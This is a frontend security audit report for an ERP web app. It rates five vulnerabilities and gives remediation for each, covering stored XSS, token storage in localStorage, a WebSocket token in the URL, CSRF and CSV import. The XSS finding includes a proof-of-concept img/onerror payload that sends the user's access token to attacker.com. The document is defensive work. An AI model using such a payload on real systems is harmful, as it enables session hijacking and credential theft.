# Frontend Security Vulnerability Assessment
**Project Component**: NexWare-ERP Frontend SPA  
**Audit Date**: May 28, 2026  
**Auditor**: Senior Security Auditor — Frontend Systems  
**Classification**: CONFIDENTIAL — Internal Engineering Use Only

---

## 1. Executive Summary

The NexWare-ERP frontend was subjected to a full security surface review covering injection vectors, token handling, session management, CSRF exposure, and dependency risks. The application performs well in session lifecycle management and correctly employs `Authorization: Bearer` token header propagation rather than cookie-based credentials for API calls. However, multiple **critical Stored XSS attack surfaces** exist throughout every page module due to the systematic use of raw `innerHTML` template injection with unescaped server-sourced data.

### 🔐 Overall Frontend Security Score: **5.9 / 10**

> [!CAUTION]
> The stored XSS surface is a **critical-severity** vulnerability that must be resolved before any public deployment. A single malicious actor with a warehouse manager account could permanently compromise all users across the tenant by injecting a script payload into an item name, customer field, or table column label.

---

## 2. Vulnerability Register

### 🔴 VULN-FE-001: Stored XSS via Unescaped innerHTML Template Injection
- **Severity**: CRITICAL
- **CVSS v3.1 Score**: 9.0 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
- **Affected Files**: `pages/items.js`, `pages/billing.js`, `pages/tables.js`, `pages/dashboard.js`, `pages/workforce.js`, `pages/warehouses.js`
- **Root Cause**: Every page module in the application constructs HTML using ES6 template literals and injects the result directly into DOM nodes via `element.innerHTML = ...` without any HTML entity encoding or sanitization. Server-sourced string values (e.g., `item.name`, `bill.customer`, `table.columns[n].name`) are interpolated raw, exactly as stored in MongoDB.

**Proof of Concept Attack Vector** (items.js, line 143):
```javascript
// VULNERABLE: item.name is rendered with zero sanitization
return `<tr>
  <td data-label="Item">
    <div class="primary-cell">${item.name}</div>  
```

If a malicious warehouse manager creates an inventory item with the name:
```
<img src=x onerror="fetch('https://attacker.com/?t='+localStorage.getItem('access_token'))">
```
Every user who views the inventory table will have their JWT access token silently exfiltrated to the attacker's server.

- **Risk Level**: CRITICAL — enables full session takeover for all tenant users
- **Remediation**: Implement a centralized HTML escaping utility:
```javascript
function escHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```
Then replace all raw `${item.name}` usages with `${escHtml(item.name)}` across all page modules.

---

### 🔴 VULN-FE-002: Access Token Stored in localStorage (XSS-Accessible)
- **Severity**: HIGH
- **CVSS v3.1 Score**: 7.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
- **Affected File**: `modules/store.js` (lines 102, 280, 306, 850)
- **Root Cause**: The JWT access token is stored in `localStorage`. `localStorage` is fully readable by any JavaScript executing in the page origin. When combined with the XSS vector above, this means any injected script can extract the live bearer token with a single call: `localStorage.getItem('access_token')`.
- **Risk Level**: HIGH — enables authentication bypass and session hijacking post-XSS
- **Remediation**: Migrate the JWT to an `HttpOnly; Secure; SameSite=Strict` cookie managed server-side. The backend FastAPI server already supports `allow_credentials=True` in its CORS configuration and can be extended to set the cookie header at login.

---

### 🟡 VULN-FE-003: WebSocket JWT Token Exposed in URL Query String
- **Severity**: MEDIUM
- **CVSS v3.1 Score**: 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)
- **Affected File**: `modules/store.js` (line 861)
- **Root Cause**: The WebSocket connection is initiated with the JWT appended as a URL query parameter:
```javascript
const wsUrl = `ws://${hostname}:8000/api/v1/realtime/ws?token=${token}`;
```
URL query parameters are routinely logged in server access logs, browser history, server-side proxies (e.g., Nginx, Caddy), and Referrer headers, exposing the JWT token to infrastructure-level logging systems.
- **Risk Level**: MEDIUM — JWT token logged in server and proxy access logs, accessible to infrastructure operators
- **Remediation**: Pass the JWT via a WebSocket sub-protocol header or an initial authenticated handshake message sent immediately after connection establishment, removing it from the URL.

---

### 🟡 VULN-FE-004: Missing CSRF Protections for State-Mutating API Calls
- **Severity**: MEDIUM
- **CVSS v3.1 Score**: 5.4 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N)
- **Root Cause**: All mutating API calls (POST, PUT, DELETE) use `fetch()` with `credentials: 'include'` but rely solely on the `Authorization: Bearer` header for authentication — no CSRF token is included. While this combination provides reasonable protection against classic CSRF (because cross-origin requests can't set custom headers), it relies entirely on the browser's CORS preflight blocking, which is bypassed in certain environments.
- **Risk Level**: MEDIUM — primarily theoretical in current implementation but becomes high-risk if auth migrates to HttpOnly cookies without a CSRF layer
- **Remediation**: Implement the Double Submit Cookie pattern or use the SameSite=Strict cookie attribute when migrating to cookie-based auth.

---

### 🟢 VULN-FE-005: No Input Validation on CSV Import
- **Severity**: LOW
- **CVSS v3.1 Score**: 3.7
- **Affected File**: `pages/items.js` — `showImportModal()` function
- **Root Cause**: CSV rows imported by managers are parsed client-side and sent directly to the backend without field validation. A maliciously crafted CSV file with oversized strings, formula injection characters (`=CMD`, `@SUM`), or binary content could cause unexpected parsing errors or trigger spreadsheet formula injection if exports are opened in Excel.
- **Risk Level**: LOW — primarily a data integrity and UX risk; backend Pydantic schemas provide a strong last line of defense
- **Remediation**: Validate CSV headers match expected item schema, strip leading `=`, `+`, `-`, `@` characters from all cell values, and limit field lengths to 255 characters client-side before submission.

---

## 3. Security Scorecard

| Category | Score | Finding |
| :--- | :---: | :--- |
| XSS / Injection Resistance | 3/10 | 🔴 Critical — raw innerHTML across all modules |
| Token Storage Security | 4/10 | 🔴 High — localStorage accessible to scripts |
| Session Management | 8/10 | 🟢 Good — 15-min access + 7-day refresh with server revocation |
| Transport Security | 7/10 | 🟡 Medium — WS token exposed in URL query string |
| CSRF Protection | 7/10 | 🟡 Medium — relies solely on CORS preflight |
| Input Validation | 7/10 | 🟡 Medium — CSV import is unvalidated |
| Dependency Risk | 8/10 | 🟢 Low — minimal dependencies, esbuild is well-maintained |

---

## 4. Immediate Remediation Priorities

1. **[CRITICAL]** Implement `escHtml()` sanitizer and apply it across all `innerHTML` template interpolations in all page modules.
2. **[HIGH]** Migrate JWT to `HttpOnly Secure SameSite=Strict` cookie after implementing the `escHtml()` fix.
3. **[MEDIUM]** Refactor WebSocket connection to pass JWT via an initial authenticated frame message, not a URL parameter.
4. **[LOW]** Add CSV field sanitization and header validation in the CSV import modal.
